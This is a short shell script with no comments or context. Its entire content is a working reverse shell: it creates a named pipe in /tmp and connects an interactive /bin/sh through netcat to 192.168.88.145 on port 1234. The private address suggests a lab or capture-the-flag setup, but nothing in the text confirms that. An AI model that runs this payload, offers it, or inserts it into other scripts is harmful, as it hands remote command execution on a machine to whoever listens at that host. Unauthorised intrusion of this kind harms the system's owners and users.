#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;
cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.88.145 1234 > /tmp/f
